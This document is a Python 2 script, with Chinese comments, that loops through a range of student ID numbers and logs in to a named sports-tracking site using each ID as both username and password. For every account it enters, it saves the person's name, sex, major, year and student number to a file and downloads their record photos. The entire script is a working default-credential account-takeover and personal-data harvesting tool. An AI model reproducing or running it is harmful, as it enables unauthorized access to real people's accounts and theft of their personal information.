#!/usr/bin/env python                                                                                                                                                           
# -*- coding: utf-8 -*-

import urllib
import urllib2
import cookielib
from bs4 import BeautifulSoup
import urlparse
from urllib2 import urlopen
from urllib import urlretrieve
import os

userInfoFile = open("userInfoFile.txt","a")
userInfoFile.write("姓名,性别,专业,学年,类别,学号,\n")

def userLogin(user_id):
    filename = 'cookie.txt'
    #声明一个MozillaCookieJar对象实例来保存cookie，之后写入文件
    cookie = cookielib.MozillaCookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))
    postdata = urllib.urlencode({
    			'uname':user_id,
    			'passwd':user_id
    		})
    #登录系统的URL
    loginUrl = 'http://b.edooon.com/login'
    loginHeader = {
    	"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
    }
    #模拟登录，并把cookie保存到变量
    result = opener.open(loginUrl, postdata)
    soup = BeautifulSoup(result.read())
    userNavList = soup.select('span[class="userNav"]')
    if userNavList:
        for userNav in userNavList:
            userInfoFile.write( userNav.get_text().encode('utf-8') + ',')
        userInfoFile.write('\n')
        out_folder = './'
        imgName = user_id+'_'
        tmpCnt = 0
        imgUrl = 'http://b.edooon.com/'
        for image in soup.findAll("img"):
            #print "Image: %(src)s" % image
            image_url = urlparse.urljoin(imgUrl, image['src'])
            filename = image["src"].split("/")[-1]
            outpath = os.path.join(out_folder, imgName+ str(tmpCnt))
            if image["src"].startswith('/recordpic'):
                urlretrieve(image_url, outpath)
                tmpCnt += 1

def tryAccount(id_start, id_end):
    for i in range(id_start, id_end):
        print 'Trying: '+(str(i))
        userLogin( str(i) );

if __name__ == "__main__":
    ID_START = 1100012968   #起始学号
    ID_END   = 1100012971    #结束学号
    tryAccount(ID_START,ID_END)

#print result.read()
#保存cookie到cookie.txt中
#cookie.save(filename,ignore_discard=True, ignore_expires=True)
